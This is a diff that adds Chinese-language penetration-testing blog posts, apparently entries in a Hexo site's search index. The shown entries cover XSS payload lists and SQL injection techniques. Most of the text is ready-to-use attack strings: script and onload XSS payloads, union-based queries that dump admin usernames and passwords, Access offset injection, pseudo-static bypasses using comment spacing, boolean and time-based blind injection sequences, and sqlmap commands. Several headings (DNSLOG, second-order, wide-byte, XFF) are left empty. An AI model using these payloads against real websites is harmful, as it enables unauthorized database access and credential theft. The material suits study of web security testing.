+<li><code>&quot;&gt;&lt;script&gt;;alert(2)&lt;/script&gt;&quot;&gt;</code> </li>
+<li><code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></li>
+<li><code>&#39;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+<li><code>&lt;IFRAME SRC=javascript:alert(‘XSS’)&gt;&lt;/IFRAME&gt;</code> 框架注入</li>
+<li><code>&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a(){alert(&#39;XSS&#39;);}&lt;/SCRIPT&gt;&lt;&quot;</code> </li>
+<li><code>&lt;A HREF=http://127.0.0.1/phpinfo.php&gt;link&lt;/A&gt;</code> //链接注入</li>
+</ul>
+<p>注：字段对输入字符有长度限制，这个可以通过burpsuite抓包改包绕过</p>
+<h2 id="受限情况下的-XSS-利用技巧"><a href="#受限情况下的-XSS-利用技巧" class="headerlink" title="受限情况下的 XSS 利用技巧"></a>受限情况下的 XSS 利用技巧</h2><p>原文地址:<a href="https://brutelogic.com.br/blog/xss-limited-input-formats/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/xss-limited-input-formats/</a></p>
+<h4 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h4><p>payload:    <code>&quot;&lt;svg/onload=alert(1)&gt;&quot;@x.y</code></p>
+<h4 id="URL（无查询）"><a href="#URL（无查询）" class="headerlink" title="URL（无查询）"></a>URL（无查询）</h4><p>payload: <code>javascript://%250Aalert(1)</code></p>
+<h4 id="URL（带查询）"><a href="#URL（带查询）" class="headerlink" title="URL（带查询）"></a>URL（带查询）</h4><p>payload: <code>javascript://https://domain.com/%250A1?alert(1):0</code></p>
+<h4 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h4><p>payload(假设key限制条件为32字符的md5密钥): <code>12345678901&lt;svg onload=alert(1)&gt;</code></p>
+<p>部分转自：<a href="https://www.freebuf.com/articles/web/43285.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/43285.html</a><br>作者：0xExploit</p>
+]]></content>
+      <categories>
+        <category>渗透之路</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web渗透笔记之sql注入（进阶篇）</title>
+    <url>/2019/04/03/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BF%9B%E9%98%B6%E7%AF%87%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="cookie中转注入"><a href="#cookie中转注入" class="headerlink" title="cookie中转注入"></a>cookie中转注入</h1><p><a href="https://wenku.baidu.com/view/99f7ce57ad02de80d4d840c1.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/99f7ce57ad02de80d4d840c1.html</a></p>
+<a id="more"></a>
+<p><img src="/images/pasted-12.png" alt="upload successful"></p>
+<p><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p><img src="/images/pasted-14.png" alt="upload successful"></p>
+<p><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><img src="/images/pasted-16.png" alt="upload successful"></p>
+<p><img src="/images/pasted-17.png" alt="upload successful"></p>
+<p><img src="/images/pasted-18.png" alt="upload successful"></p>
+<h1 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h1><p><strong>poc:</strong><br><code>1%&#39; and &#39;%1%&#39;=&#39;%1</code>  返回正常<br><code>1%&#39; and &#39;%1%&#39;=&#39;%2</code>  无返回结果</p>
+<p>关键字=’ and [查询条件] and ‘%’=’<br><strong>例：</strong><br>select * from 表名 where 字段 like ‘%<strong>‘ and 1=1 and ‘%’=’</strong>%’</p>
+<hr>
+<h1 id="登录框注入语句"><a href="#登录框注入语句" class="headerlink" title="登录框注入语句"></a>登录框注入语句</h1><pre><code>a&apos; or (select count(*) from admin)&gt;0 and &apos;1&apos;=&apos;1</code></pre><hr>
+<h1 id="偏移注入（Access）"><a href="#偏移注入（Access）" class="headerlink" title="偏移注入（Access）"></a>偏移注入（Access）</h1><p>偏移注入主要是针对知道表，但是不知道字段的。</p>
+<h4 id="00x1-判断字段数"><a href="#00x1-判断字段数" class="headerlink" title="00x1 判断字段数"></a>00x1 判断字段数</h4><blockquote>
+<p><a href="http://www.test.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.test.com/newslist.asp?id=1</a> order by 19 #错误<br><a href="http://www.test.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.test.com/newslist.asp?id=1</a> order by 18 #正确</p>
+</blockquote>
+<h4 id="00x2-爆出显示位"><a href="#00x2-爆出显示位" class="headerlink" title="00x2 爆出显示位"></a>00x2 爆出显示位</h4><blockquote>
+<p><a href="http://wwwxxx/newslist.asp?id=1" target="_blank" rel="noopener">http://wwwxxx/newslist.asp?id=1</a> UNION SELECT<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin</p>
+</blockquote>
+<h4 id="00x3-判断表内存在的字段数"><a href="#00x3-判断表内存在的字段数" class="headerlink" title="00x3 判断表内存在的字段数"></a>00x3 判断表内存在的字段数</h4><p>接下来我们利用“*”代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。</p>
+<p>复制代码</p>
+<blockquote>
+<p><a href="http://www.xxx/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误<br><a href="http://www.xxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin     #错误<br><a href="http://www.xxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin        #错误<br>………<br><a href="http://www.xxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确</p>
+</blockquote>
+<p>复制代码<br>说明了sys_admin表下有11个字段。</p>
+<p>偏移注入的基本公式为:</p>
+<blockquote>
+<p> order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案<br>也就是18-11=7<br>18-7x2=4<br>得到答案等于：4</p>
+</blockquote>
+<p>然后依旧是套公式的过程。</p>
+<blockquote>
+<p><a href="http://wwwxxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://wwwxxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on<br>a.id = b.id)</p>
+</blockquote>
+<p>#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。<br>#后面的是sql，可作公式。<br>如此便爆出了账号密码。</p>
+<hr>
+<h1 id="DNSLOG-注入"><a href="#DNSLOG-注入" class="headerlink" title="DNSLOG 注入"></a>DNSLOG 注入</h1><hr>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><hr>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><hr>
+<h1 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h1><hr>
+<h1 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h1><p>伪静态，主要是为了隐藏传递的参数名，伪静态只是一种URL重写的手段，既然能接受参数输入，所以就可能存在sql注入。</p>
+<ol>
+<li>判断页面是静态还是伪静态：</li>
+</ol>
+<ul>
+<li>F12打开控制台，输入<code>alert(document.lastModified);</code><br>多次刷新网页，用同样的方法，比较弹窗的时间，如果都是一样的，那就是真实的静态网页，否则就是伪静态（动态网页）。</li>
+</ul>
+<ol start="2">
+<li><p>中转注入法<br>通过 <a href="http://www.xxx.com/news.php?id=1" target="_blank" rel="noopener">http://www.xxx.com/news.php?id=1</a> 做了伪静态之后就成这样了<br><a href="http://www.xxx.com/news.php/id/1.html" target="_blank" rel="noopener">http://www.xxx.com/news.php/id/1.html</a> 刺猬写的COOKIES注入中转器的get方式注入的代码修改了一下，只要把注入的参数写成1 ，然后在提交的语句后面加上.html那么就可以直接放到注入软件注入了。</p>
+</li>
+<li><p>手工注入法</p>
+<ol>
+<li><p> <a href="http://www.xxx.com/play/Diablo.html" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo.html</a></p>
+<p> <a href="http://www.xxx.com/down/html/?772.html" target="_blank" rel="noopener">http://www.xxx.com/down/html/?772.html</a></p>
+</li>
+<li><p>测试注入：</p>
+<blockquote>
+<p><a href="http://www.xxx.com/down/html/?772-1.html" target="_blank" rel="noopener">http://www.xxx.com/down/html/?772-1.html</a>  //若页面发生变化，则存在注入<br><a href="http://www.xxx.com/play/Diablo&#39;.html" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo&#39;.html</a><br><a href="http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;1" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;1</a> /<em>.html<br><a href="http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;2" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;2</a> /</em>.html<br><a href="http://www.xxx.com/page/html/?56′/**/and/**/1=1/*.html" target="_blank" rel="noopener">http://www.xxx.com/page/html/?56′/**/and/**/1=1/*.html</a> 正常<br><a href="http://www.xxx.com/page/html/?56′/**/and/**/1=2/*.html" target="_blank" rel="noopener">http://www.xxx.com/page/html/?56′/**/and/**/1=2/*.html</a> 出错</p>
+</blockquote>
+</li>
+<li><p>手工注入注意<br> <a href="http://www.xxx.net/news/html/?410.html" target="_blank" rel="noopener">http://www.xxx.net/news/html/?410.html</a></p>
+<pre><code>`http://www.xxx.net/news/html/410&apos;union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where&apos;1&apos;=&apos;1.html`</code></pre><p><code>注：
+伪静态的注入和URL的普通GET注入不太相同
+。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用/**/这个注释符号表示空格。</code></p>
+</li>
+</ol>
+</li>
+<li><p>SQLmap方法</p>
+<p> 在sqlmap中伪静态哪儿存在注入点就加*</p>
+<blockquote>
+<p><a href="http://www.cunlide.com/id1/1/id2/2" target="_blank" rel="noopener">http://www.cunlide.com/id1/1/id2/2</a></p>
+<pre><code>python   sqlmap.py -u “http://www.xxx.com/id1/1*/id2/2″</code></pre></blockquote>
+<blockquote>
+<p><a href="http://www.xxx.com/news/class/?103.htm" target="_blank" rel="noopener">http://www.xxx.com/news/class/?103.htm</a></p>
+<pre><code>python  sqlmap.py -u  “http://www.xxx.com/news/class/?103*.html”</code></pre></blockquote>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>渗透之路</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>sql注入</tag>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web渗透笔记之sql注入（基础篇）</title>
+    <url>/2019/04/02/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="sql注入简介"><a href="#sql注入简介" class="headerlink" title="sql注入简介"></a>sql注入简介</h2><p>sql注入攻击是由插入或注入一段从客户端输入的sql语句引起的。一个成功的sql注入利用(exploit)能从数据库读取敏感数据，改变数据库数据（通过Insert/Update/Delete），在数据库执行</p>
+<a id="more"></a>
+<p>(execute)管理员操作（比如关闭数据库管理系统DBMS），在DBMS文件系统上回复指定文件的内容和在一些场景下执行操作系统命令（command）。sql注入攻击是一种注入攻击，它将sql命令注入到数据平面（data-plan）使得影响预先设置的sql命令的执行结果。</p>
+<h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><hr>
+<p>1.<strong>字符型</strong></p>
+<p>法一：</p>
+<blockquote>
+<ul>
+<li><a href="http://www.xxx.com/xxx.asp?n=article&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=article&#39;</a>  报错</li>
+<li><a href="http://www.xxx.com/xxx.asp?n=article&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=article&#39;</a> and ‘1’ =’1，查询成功</li>
+<li><a href="http://www.xxx.com/xxx.asp?n=article&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=article&#39;</a> and ‘1’ =’2，查询失败，返回结果为空或错误</li>
+</ul>
+</blockquote>
+<p>法二：</p>
+<blockquote>
+<ul>
+<li>1’ and 1=1 # （1’ and 1=1- -+）<ul>
+<li>(#或–代表注释的意思，用- -时后需加空格，或用+也可执行成功)<br>例：select * from table where name =’article’ and 1=1- -+’(- -+可将后面的注释掉)</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><strong>说明存在字符型注入</strong></p>
+<p>2.<strong>数字型</strong></p>
+<blockquote>
+<p><a href="http://www.xxx.com/xxx.asp?n=22&#39;" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22&#39;</a>  返回错误(网页消失)<br><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> and 1=1 返回正常<br><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> and 1=2返回错误   </p>
+</blockquote>
+<p><strong>说明存在数字型注入</strong> </p>
+<h2 id="猜解SQL查询语句中的字段"><a href="#猜解SQL查询语句中的字段" class="headerlink" title="猜解SQL查询语句中的字段"></a><strong>猜解SQL查询语句中的字段</strong></h2><hr>
+<blockquote>
+<p><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> order by n<br>n为数字，从1开始，当查询到n+1时报错，则字段数为n</p>
+</blockquote>
+<blockquote>
+<p><a href="http://www.xxx.com/xxx.asp?n=22" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?n=22</a> union select 1,2…n from admin<br> // admin为猜解的表名</p>
+</blockquote>
+<p>order by  查询几个字段  然后union select 1,2…查看相关字段(回显id代表的含义)。例如union select user(),database()<br>2.<br><img src="/images/pasted-1.png" alt="upload successful"></p>
+<p>3.获取数据库中的表：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#    //字符型</span></span><br><span class="line"><span class="keyword">id</span> =<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+
+<p>4.获取表中的字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id =1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users ’# //若'</span>字符被转义则可换成十六进制形式</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=’<span class="keyword">data</span>’) </span><br><span class="line">//<span class="keyword">data</span> 和<span class="keyword">users</span>为表名</span><br></pre></td></tr></table></figure>
+<p>5.获取数据：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=-1 union <span class="keyword">select</span> <span class="keyword">version</span>(),(<span class="keyword">select</span> thekey <span class="keyword">from</span> <span class="keyword">data</span>) //thekey是字段名</span><br></pre></td></tr></table></figure>
+<p>7.下载数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<h3 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h3><p>读出所有库:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://www.xx.com/1.php?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+
+<p>读出所有表:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://www.xx.com/1.php?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span> <span class="keyword">from</span> information_schema.tables(<span class="keyword">admin</span>) <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+<p>mysql4.1以上版本支持concat函数</p>
+<p>a.  执行语句<br>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x77677978797765626D6973</span></span><br></pre></td></tr></table></figure><br> 结果爆出  admin等表 </p>
+<p>b.  执行:</p>
+<pre><code> and 1=2 union select 1,2,3,4,group_concat(column_name),6,7,8,9,10 from
+    information_schema.columns where table_name=0x61646D696E
+
+结果爆出:  username,password  等一些 字段</code></pre><p>c.执行:</p>
+<pre><code> and 1=2 union select 1,2,3,4,group_concat(username,0x3a,password),6,7,
+    8,9,10 from admin
+结果爆出:字段内容</code></pre><h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入<code>1&#39;and 1=1 #</code>，显示存在<br>输入<code>1&#39;and 1=2 #</code>，显示不存在：说明存在</p>
+<h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><ul>
+<li>输入<code>1&#39; and length(database())=1 #</code>，显示不存在</li>
+<li>输入<code>1&#39; and length(database())=2 #</code>，显示不存在；</li>
+<li>输入<code>1&#39; and length(database())=3 #</code>，显示存在； </li>
+<li><em>二分法猜名字*</em></li>
+<li>输入<code>1&#39; and ascii(substr(databse(),1,1))&gt;97 #</code>，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</li>
+<li>输入<code>1&#39; and ascii(substr(databse(),1,1))&lt;122 #</code>，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）</li>
+</ul>
+<h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p><strong>首先猜解数据库中表的数量：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span> <span class="comment"># 显示不存在\</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() )=<span class="number">2</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>说明数据库中共有两个表，接着挨个猜解表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">9</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure>
+<p><strong>说明表名长为9</strong></p>
+<p><strong>表名猜测一样用二分法</strong></p>
+<h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br></pre></td></tr></table></figure>
+<p>…</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">8</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure>
+<p>猜字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment"># 显示不存在</span></span><br></pre></td></tr></table></figure>
+<p>…<br> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">7</span> <span class="comment"># 显示存在</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>长度为7，然后二分法猜表名<h3 id="5-猜数据-，一样思路"><a href="#5-猜数据-，一样思路" class="headerlink" title="5.猜数据 ，一样思路"></a>5.猜数据 ，一样思路</h3><h1 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h1><h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3>输入<code>1’ and sleep(5) #</code>，感觉到明显延迟；<br>输入<code>1 and sleep(5) #</code>，没有延迟；<br>说明字符型注入<h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> 1’ and if(length(database())=1,sleep(5),1) <span class="comment"># 没有延迟</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and if(length(database())=4,sleep(5),1) <span class="comment"># 明显延迟</span></span><br></pre></td></tr></table></figure></li>
+<li><em>说明数据库名长度为4个字符。<br>接着采用二分法猜解数据库名：*</em><figure class="highlight"><table><tr><td class="code"><pre><span class="line">1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</span><br><span class="line">…</span><br><span class="line">1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</span><br><span class="line">1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</span><br></pre></td></tr></table></figure></li>
+<li><em>说明数据库名的第一个字符为小写字母d。*</em><h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3></li>
+<li><em>首先猜解数据库中表的数量：*</em><figure class="highlight"><table><tr><td class="code"><pre><span class="line">* 1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</span><br><span class="line">* 1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</span><br></pre></td></tr></table></figure></li>
+<li><em>说明数据库中共有两个表。*</em></li>
+</ul>
+<p><strong>接着挨个猜解表名：</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">* 1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</span><br><span class="line">* …</span><br><span class="line">* 1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</span><br></pre></td></tr></table></figure>
+<p><strong>说明第一个表名长度为9。二分法猜出表名</strong></p>
+<h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p><strong>首先猜解表中字段的数量：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and if((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment"># 没有延迟</span></span><br><span class="line">…</span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">8</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment"># 明显延迟</span></span><br></pre></td></tr></table></figure>
+<p><strong>说明users表中有8个字段。</strong></p>
+<p><strong>接着挨个猜解字段名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1’ and if(length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment"># 没有延迟</span></span><br><span class="line">…</span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">7</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment"># 明显延迟**</span></span><br></pre></td></tr></table></figure>
+<p><strong>说明users表的第一个字段长度为7个字符。<br>采用二分法即可猜解出各个字段名。</strong></p>
+<h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
+<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>1.输入账号密码，用bp抓包<br>2.复制包的内容到txt文本<br>3.用sqlmap注入  <code>sqlmap.py -r post.txt</code></p>
+<h1 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h1><p>1.不支持时间盲注<br>2.只能爆破表名，不建议手工，可用啊D，sqlmap等工具</p>
+<hr>
